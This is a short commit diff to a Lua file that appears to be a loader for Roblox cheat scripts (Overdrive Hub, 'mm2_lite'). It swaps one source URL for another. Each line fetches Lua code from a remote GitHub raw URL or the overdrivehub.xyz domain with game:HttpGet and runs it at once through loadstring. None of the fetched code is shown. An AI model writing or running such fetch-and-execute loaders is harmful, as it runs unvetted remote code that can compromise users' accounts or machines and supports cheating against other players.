246b1baf47ed2bc841d5425107a4372a9c6286eb
elfandtears <poo23838+alt1@gmail.com>
2025-01-25 11:34:41 -0700

    Update dauthscriptfull.lua

--- dauthscriptfull.lua
+++ dauthscriptfull.lua
@@ -1,2 +1,2 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Fizzzmy/OverdriveH/refs/heads/main/overdrivehub.lua'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/639aa5bdc6b3b527051de96d.lua", true))()
 loadstring(game:HttpGet("https://overdrivehub.xyz/?d=auth&script=mm2_lite"))()
